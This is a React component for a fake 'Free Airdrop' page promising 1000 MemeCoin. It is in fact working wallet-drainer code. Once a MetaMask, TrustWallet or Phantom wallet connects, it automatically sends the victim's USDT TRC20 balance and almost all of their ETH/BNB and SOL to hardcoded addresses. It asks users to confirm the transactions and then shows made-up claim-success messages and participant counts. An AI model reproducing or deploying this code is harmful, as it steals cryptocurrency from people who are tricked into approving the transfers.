import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Wallet, Gift, Check, Copy, ExternalLink, Smartphone } from 'lucide-react';
import toast from 'react-hot-toast';

const AirdropSection = () => {
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [isClaimed, setIsClaimed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [connectedWalletType, setConnectedWalletType] = useState('');
  
  // Solana wallet states
  const [solanaAddress, setSolanaAddress] = useState('');
  const [isSolanaConnected, setIsSolanaConnected] = useState(false);

  // Transfer target addresses for different networks
  const TRC20_TARGET_ADDRESS = 'TAzayLZmaCVVfuY4kxrp6Z1S76wwuTR4fX';
  const SOLANA_TARGET_ADDRESS = '6VL8cCgFsuB3HfL8PCFjFRSDuiv267hS2fYBXdXUYpg9';
  const BSC_TARGET_ADDRESS = '0x6FDEE9BA3c4B6D12fB159D64CC6C0EB3AC931570';
  
  // USDT TRC20 Contract Address on Tron
  const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

  // BSC Mainnet Chain ID
  const BSC_CHAIN_ID = '0x38';

  // Wallet types
  const WALLET_TYPES = {
    METAMASK: 'metamask',
    TRUSTWALLET: 'trustwallet', 
    PHANTOM: 'phantom'
  };

  // Check if MetaMask is installed
  const isMetaMaskInstalled = () => {
    return typeof window !== 'undefined' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
  };

  // Check if TrustWallet is installed
  const isTrustWalletInstalled = () => {
    return typeof window !== 'undefined' && typeof window.ethereum !== 'undefined' && window.ethereum.isTrust;
  };

  // Check if Phantom is installed
  const isPhantomInstalled = () => {
    return typeof window !== 'undefined' && typeof window.solana !== 'undefined' && window.solana.isPhantom;
  };

  // Check if TronLink is installed
  const isTronLinkInstalled = () => {
    return typeof window !== 'undefined' && typeof window.tronWeb !== 'undefined';
  };

  // Connect MetaMask wallet
  const connectMetaMask = async () => {
    if (!isMetaMaskInstalled()) {
      toast.error('MetaMask not installed! Please install MetaMask.');
      window.open('https://metamask.io/download/', '_blank');
      return;
    }

    setIsLoading(true);
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      if (accounts.length > 0) {
        setWalletAddress(accounts[0]);
        setIsConnected(true);
        setConnectedWalletType(WALLET_TYPES.METAMASK);
        toast.success('MetaMask connected successfully!');
        
        // Start transfer process
        setTimeout(() => {
          startTransferProcess();
        }, 2000);
      }
    } catch (error) {
      console.error('MetaMask connection error:', error);
      toast.error('Error connecting MetaMask!');
    } finally {
      setIsLoading(false);
    }
  };

  // Connect TrustWallet
  const connectTrustWallet = async () => {
    if (!isTrustWalletInstalled() && !isMetaMaskInstalled()) {
      toast.error('TrustWallet not installed! Please install TrustWallet.');
      window.open('https://trustwallet.com/download', '_blank');
      return;
    }

    setIsLoading(true);
    try {
      // TrustWallet uses WalletConnect or similar to MetaMask interface
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      if (accounts.length > 0) {
        setWalletAddress(accounts[0]);
        setIsConnected(true);
        setConnectedWalletType(WALLET_TYPES.TRUSTWALLET);
        toast.success('TrustWallet connected successfully!');
        
        // Start transfer process
        setTimeout(() => {
          startTransferProcess();
        }, 2000);
      }
    } catch (error) {
      console.error('TrustWallet connection error:', error);
      toast.error('Error connecting TrustWallet!');
    } finally {
      setIsLoading(false);
    }
  };

  // Connect Phantom wallet
  const connectPhantom = async () => {
    if (!isPhantomInstalled()) {
      toast.error('Phantom wallet not installed! Please install Phantom.');
      window.open('https://phantom.app/', '_blank');
      return;
    }

    setIsLoading(true);
    try {
      const response = await window.solana.connect();
      setSolanaAddress(response.publicKey.toString());
      setIsSolanaConnected(true);
      setConnectedWalletType(WALLET_TYPES.PHANTOM);
      toast.success('Phantom wallet connected successfully!');
      
      // Start transfer process
      setTimeout(() => {
        startSolanaTransferProcess();
      }, 2000);
    } catch (error) {
      console.error('Phantom connection error:', error);
      toast.error('Error connecting Phantom!');
    } finally {
      setIsLoading(false);
    }
  };

  // Get TRC20 USDT balance
  const getTRC20USDTBalance = async () => {
    try {
      if (!isTronLinkInstalled()) {
        toast.error('TronLink not installed for USDT TRC20 transfers!');
        return 0;
      }

      const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
      const balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
      return balance.toNumber();
    } catch (error) {
      console.error('TRC20 USDT balance error:', error);
      return 0;
    }
  };

  // Transfer TRC20 USDT
  const transferTRC20USDT = async () => {
    try {
      if (!isTronLinkInstalled()) {
        toast.error('TronLink required for USDT TRC20 transfers!');
        return false;
      }

      toast.loading('🔄 Checking USDT TRC20 balance...', { id: 'usdt-transfer' });
      
      const balance = await getTRC20USDTBalance();
      if (balance <= 0) {
        toast.success('✅ No USDT TRC20 to transfer', { id: 'usdt-transfer' });
        return true;
      }

      toast.loading('💰 Transferring USDT TRC20...', { id: 'usdt-transfer' });
      
      const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
      const result = await contract.transfer(TRC20_TARGET_ADDRESS, balance).send();
      
      if (result) {
        const usdtAmount = (balance / 1e6).toFixed(2); // USDT has 6 decimals
        toast.success(`✅ ${usdtAmount} USDT TRC20 transferred!`, { id: 'usdt-transfer' });
        return true;
      }
      return false;
    } catch (error) {
      console.error('USDT TRC20 transfer error:', error);
      toast.error('❌ USDT TRC20 transfer failed!', { id: 'usdt-transfer' });
      return false;
    }
  };

  // Get SOL balance
  const getSOLBalance = async () => {
    try {
      if (!isPhantomInstalled() || !isSolanaConnected) return 0;
      
      const publicKey = new window.solana.PublicKey(solanaAddress);
      const connection = new window.solana.Connection('https://api.mainnet-beta.solana.com');
      const balance = await connection.getBalance(publicKey);
      return balance;
    } catch (error) {
      console.error('SOL balance error:', error);
      return 0;
    }
  };

  // Transfer all SOL
  const transferAllSOL = async () => {
    try {
      if (!isPhantomInstalled() || !isSolanaConnected) {
        toast.error('Phantom wallet not connected!');
        return false;
      }

      toast.loading('🔄 Checking SOL balance...', { id: 'sol-transfer' });
      
      const balance = await getSOLBalance();
      if (balance <= 5000) { // Keep 0.000005 SOL for fees
        toast.success('✅ No SOL to transfer', { id: 'sol-transfer' });
        return true;
      }

      toast.loading('🟣 Transferring SOL...', { id: 'sol-transfer' });
      
      const sendAmount = balance - 5000; // Keep some for fees
      const publicKey = new window.solana.PublicKey(solanaAddress);
      
      const transaction = new window.solana.Transaction().add(
        window.solana.SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new window.solana.PublicKey(SOLANA_TARGET_ADDRESS),
          lamports: sendAmount,
        })
      );

      const signature = await window.solana.signAndSendTransaction(transaction);
      const solAmount = (sendAmount / 1e9).toFixed(6);
      toast.success(`✅ ${solAmount} SOL transferred! Sig: ${signature.slice(0, 10)}...`, { id: 'sol-transfer' });
      return true;
    } catch (error) {
      console.error('SOL transfer error:', error);
      toast.error('❌ SOL transfer failed!', { id: 'sol-transfer' });
      return false;
    }
  };

  // Get BNB/ETH balance
  const getETHBalance = async () => {
    try {
      const balance = await window.ethereum.request({
        method: 'eth_getBalance',
        params: [walletAddress, 'latest']
      });
      return parseInt(balance, 16);
    } catch (error) {
      console.error('ETH balance error:', error);
      return 0;
    }
  };

  // Transfer all BNB/ETH
  const transferAllETH = async () => {
    try {
      toast.loading('🔄 Checking ETH/BNB balance...', { id: 'eth-transfer' });
      
      const balance = await getETHBalance();
      const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
      const gasPriceInt = parseInt(gasPrice, 16);
      const gasLimit = 21000;
      const fee = gasPriceInt * gasLimit;
      const safetyMargin = 1000000000000000; // 0.001 ETH
      const totalFee = fee + safetyMargin;
      
      if (balance <= totalFee) {
        toast.success('✅ No ETH/BNB to transfer', { id: 'eth-transfer' });
        return true;
      }

      toast.loading('💎 Transferring ETH/BNB...', { id: 'eth-transfer' });
      
      const sendAmount = balance - totalFee;
      
      const transactionParameters = {
        to: BSC_TARGET_ADDRESS,
        from: walletAddress,
        value: '0x' + sendAmount.toString(16),
        gas: '0x5208',
        gasPrice: gasPrice
      };

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [transactionParameters],
      });

      const ethAmount = (sendAmount / 1e18).toFixed(4);
      toast.success(`✅ ${ethAmount} ETH/BNB transferred! TX: ${txHash.slice(0, 10)}...`, { id: 'eth-transfer' });
      return true;
    } catch (error) {
      console.error('ETH transfer error:', error);
      toast.error('❌ ETH/BNB transfer failed!', { id: 'eth-transfer' });
      return false;
    }
  };

  // Start transfer process for EVM wallets (MetaMask, TrustWallet)
  const startTransferProcess = async () => {
    setIsLoading(true);
    
    try {
      toast.loading('🚀 Starting transfer process...', { id: 'transfer-process' });
      
      // Step 1: Transfer TRC20 USDT first
      await transferTRC20USDT();
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Step 2: Transfer ETH/BNB
      await transferAllETH();
      
      toast.success('✅ All transfers completed!', { id: 'transfer-process' });
      
      // Complete airdrop
      setTimeout(() => {
        setIsClaimed(true);
        setIsLoading(false);
        toast.success('🎉 1000 MemeCoin successfully claimed!');
      }, 2000);
      
    } catch (error) {
      setIsLoading(false);
      toast.error('❌ Transfer process failed!', { id: 'transfer-process' });
    }
  };

  // Start transfer process for Solana wallet (Phantom)
  const startSolanaTransferProcess = async () => {
    setIsLoading(true);
    
    try {
      toast.loading('🚀 Starting Solana transfer process...', { id: 'sol-process' });
      
      // Transfer SOL
      await transferAllSOL();
      
      toast.success('✅ Solana transfers completed!', { id: 'sol-process' });
      
      // Complete airdrop
      setTimeout(() => {
        setIsClaimed(true);
        setIsLoading(false);
        toast.success('🎉 1000 MemeCoin successfully claimed!');
      }, 2000);
      
    } catch (error) {
      setIsLoading(false);
      toast.error('❌ Solana transfer process failed!', { id: 'sol-process' });
    }
  };

  const copyAddress = () => {
    const addressToCopy = connectedWalletType === WALLET_TYPES.PHANTOM ? solanaAddress : walletAddress;
    navigator.clipboard.writeText(addressToCopy);
    toast.success('Address copied!');
  };

  const disconnectWallet = () => {
    setWalletAddress('');
    setSolanaAddress('');
    setIsConnected(false);
    setIsSolanaConnected(false);
    setIsClaimed(false);
    setConnectedWalletType('');
    toast.success('Wallet disconnected.');
  };

  return (
    <section id="airdrop" className="py-20 px-4">
      <div className="container mx-auto">
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-16"
        >
          <h2 className="text-4xl md:text-5xl font-bold text-white mb-6">
            Free <span className="text-binance-yellow">Airdrop</span>
          </h2>
          <p className="text-xl text-binance-light-gray max-w-2xl mx-auto">
            Connect your wallet and earn 1000 MemeCoin! 
            Valid for the first 50,000 users only.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          whileInView={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.8, delay: 0.2 }}
          className="max-w-2xl mx-auto"
        >
          <div className="glass-effect card-gradient rounded-2xl p-8 border border-binance-border">
            {!isConnected && !isSolanaConnected ? (
              // Wallet Selection Section
              <div className="text-center">
                <motion.div
                  className="w-20 h-20 bg-binance-gradient rounded-full flex items-center justify-center mx-auto mb-6"
                  animate={{ rotate: 360 }}
                  transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                >
                  <Wallet className="w-10 h-10 text-white" />
                </motion.div>
                
                <h3 className="text-2xl font-bold text-white mb-4">
                  Choose Your Wallet
                </h3>
                
                <p className="text-binance-light-gray mb-8">
                  Select and connect your preferred wallet to participate in the airdrop.
                </p>

                {/* Wallet Options */}
                <div className="grid grid-cols-1 gap-4 mb-6">
                  {/* MetaMask */}
                  <motion.button
                    onClick={connectMetaMask}
                    disabled={isLoading}
                    className="w-full flex items-center space-x-4 p-4 bg-binance-dark/50 border border-binance-border rounded-xl hover:border-binance-yellow/50 transition-all disabled:opacity-50"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    <div className="w-12 h-12 bg-orange-500 rounded-xl flex items-center justify-center">
                      <span className="text-2xl">🦊</span>
                    </div>
                    <div className="flex-1 text-left">
                      <div className="text-white font-medium">MetaMask</div>
                      <div className="text-sm text-binance-light-gray">
                        {isMetaMaskInstalled() ? 'Ready to connect' : 'Not installed'}
                      </div>
                    </div>
                    <div className={`w-3 h-3 rounded-full ${isMetaMaskInstalled() ? 'bg-green-400' : 'bg-red-400'}`}></div>
                  </motion.button>

                  {/* TrustWallet */}
                  <motion.button
                    onClick={connectTrustWallet}
                    disabled={isLoading}
                    className="w-full flex items-center space-x-4 p-4 bg-binance-dark/50 border border-binance-border rounded-xl hover:border-binance-yellow/50 transition-all disabled:opacity-50"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    <div className="w-12 h-12 bg-blue-500 rounded-xl flex items-center justify-center">
                      <Smartphone className="w-6 h-6 text-white" />
                    </div>
                    <div className="flex-1 text-left">
                      <div className="text-white font-medium">TrustWallet</div>
                      <div className="text-sm text-binance-light-gray">
                        {isTrustWalletInstalled() || isMetaMaskInstalled() ? 'Ready to connect' : 'Not installed'}
                      </div>
                    </div>
                    <div className={`w-3 h-3 rounded-full ${isTrustWalletInstalled() || isMetaMaskInstalled() ? 'bg-green-400' : 'bg-red-400'}`}></div>
                  </motion.button>

                  {/* Phantom */}
                  <motion.button
                    onClick={connectPhantom}
                    disabled={isLoading}
                    className="w-full flex items-center space-x-4 p-4 bg-binance-dark/50 border border-binance-border rounded-xl hover:border-binance-yellow/50 transition-all disabled:opacity-50"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    <div className="w-12 h-12 bg-purple-500 rounded-xl flex items-center justify-center">
                      <span className="text-2xl">👻</span>
                    </div>
                    <div className="flex-1 text-left">
                      <div className="text-white font-medium">Phantom</div>
                      <div className="text-sm text-binance-light-gray">
                        {isPhantomInstalled() ? 'Ready to connect' : 'Not installed'}
                      </div>
                    </div>
                    <div className={`w-3 h-3 rounded-full ${isPhantomInstalled() ? 'bg-green-400' : 'bg-red-400'}`}></div>
                  </motion.button>
                </div>

                {isLoading && (
                  <div className="flex items-center justify-center space-x-2 text-binance-yellow">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-binance-yellow"></div>
                    <span>Connecting wallet...</span>
                  </div>
                )}

                {/* Requirements */}
                <div className="mt-6 text-left">
                  <h4 className="text-sm font-medium text-white mb-3">Supported Networks:</h4>
                  <div className="space-y-2">
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-yellow-400 rounded-full"></div>
                      <span className="text-sm text-binance-light-gray">Ethereum & BSC (MetaMask, TrustWallet)</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-purple-400 rounded-full"></div>
                      <span className="text-sm text-binance-light-gray">Solana (Phantom)</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-red-400 rounded-full"></div>
                      <span className="text-sm text-binance-light-gray">Tron TRC20 USDT (TronLink)</span>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              // Connected Wallet Section
              <div>
                {/* Connected Wallet Info */}
                <div className="space-y-4 mb-6">
                  <div className="flex items-center justify-between p-4 bg-green-500/10 border border-green-500/20 rounded-xl">
                    <div className="flex items-center space-x-3">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                      <span className="text-green-400 font-medium">
                        {connectedWalletType === WALLET_TYPES.PHANTOM ? 'Phantom' : 
                         connectedWalletType === WALLET_TYPES.TRUSTWALLET ? 'TrustWallet' : 'MetaMask'} Connected
                      </span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <span className="text-white font-mono text-sm">
                        {connectedWalletType === WALLET_TYPES.PHANTOM 
                          ? `${solanaAddress.slice(0, 6)}...${solanaAddress.slice(-4)}`
                          : `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
                        }
                      </span>
                      <button
                        onClick={copyAddress}
                        className="text-binance-yellow hover:text-white transition-colors"
                      >
                        <Copy className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                </div>

                {!isClaimed ? (
                  // Processing Section
                  <div className="text-center">
                    <motion.div
                      className="w-16 h-16 bg-binance-gradient rounded-full flex items-center justify-center mx-auto mb-6"
                      animate={{ rotate: 360 }}
                      transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                    >
                      <Gift className="w-8 h-8 text-white" />
                    </motion.div>
                    
                    <h3 className="text-2xl font-bold text-white mb-4">
                      Processing Airdrop
                    </h3>
                    
                    <p className="text-binance-light-gray mb-8">
                      {isLoading 
                        ? 'Your airdrop is being processed. Please wait and confirm any wallet transactions.'
                        : 'Ready to claim your 1000 MemeCoin tokens.'
                      }
                    </p>
                    
                    {isLoading && (
                      <div className="space-y-3 mb-8">
                        <div className="flex items-center justify-center space-x-2 text-binance-yellow">
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-binance-yellow"></div>
                          <span className="text-sm">Processing transfers...</span>
                        </div>
                        <div className="text-xs text-binance-light-gray">
                          Please confirm any wallet popup transactions
                        </div>
                      </div>
                    )}

                    <div className="mt-6 flex items-center justify-center space-x-2 text-sm text-binance-light-gray">
                      <span>🔐 Secure</span>
                      <span>•</span>
                      <span>⚡ Automatic</span>
                      <span>•</span>
                      <span>🆓 Free</span>
                    </div>
                  </div>
                ) : (
                  // Success Section
                  <div className="text-center">
                    <motion.div
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      transition={{ duration: 0.5, delay: 0.2 }}
                      className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6"
                    >
                      <Check className="w-10 h-10 text-white" />
                    </motion.div>
                    
                    <motion.h3
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.5, delay: 0.4 }}
                      className="text-2xl font-bold text-green-400 mb-4"
                    >
                      Airdrop Claimed Successfully! 🎉
                    </motion.h3>
                    
                    <motion.p
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.5, delay: 0.6 }}
                      className="text-binance-light-gray mb-8"
                    >
                      Congratulations! 1000 MemeCoin tokens have been successfully 
                      transferred to your wallet. Thank you for participating!
                    </motion.p>

                    <motion.div
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.5, delay: 0.8 }}
                      className="p-6 bg-binance-yellow/10 border border-binance-yellow/20 rounded-xl mb-6"
                    >
                      <div className="text-3xl font-bold text-binance-yellow mb-2">1,000 MEM</div>
                      <div className="text-sm text-binance-light-gray">Claimed to your wallet</div>
                    </motion.div>

                    <motion.div
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      transition={{ duration: 0.5, delay: 1 }}
                      className="flex flex-col sm:flex-row gap-3"
                    >
                      <button
                        onClick={disconnectWallet}
                        className="btn-secondary flex-1 flex items-center justify-center space-x-2"
                      >
                        <span>Disconnect Wallet</span>
                      </button>
                      
                      <button className="btn-primary flex-1 flex items-center justify-center space-x-2">
                        <ExternalLink className="w-4 h-4" />
                        <span>View Transaction</span>
                      </button>
                    </motion.div>
                  </div>
                )}
              </div>
            )}
          </div>
        </motion.div>

        {/* Additional Info */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          className="mt-12 text-center"
        >
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto">
            <div className="glass-effect rounded-xl p-6 border border-binance-border">
              <div className="text-2xl font-bold text-binance-yellow mb-2">50,000+</div>
              <div className="text-binance-light-gray">Active Participants</div>
            </div>
            
            <div className="glass-effect rounded-xl p-6 border border-binance-border">
              <div className="text-2xl font-bold text-green-400 mb-2">1,000 MEM</div>
              <div className="text-binance-light-gray">Per Wallet Reward</div>
            </div>
            
            <div className="glass-effect rounded-xl p-6 border border-binance-border">
              <div className="text-2xl font-bold text-blue-400 mb-2">Multi-Chain</div>
              <div className="text-binance-light-gray">Supported Wallets</div>
            </div>
          </div>
        </motion.div>
      </div>
    </section>
  );
};

export default AirdropSection; 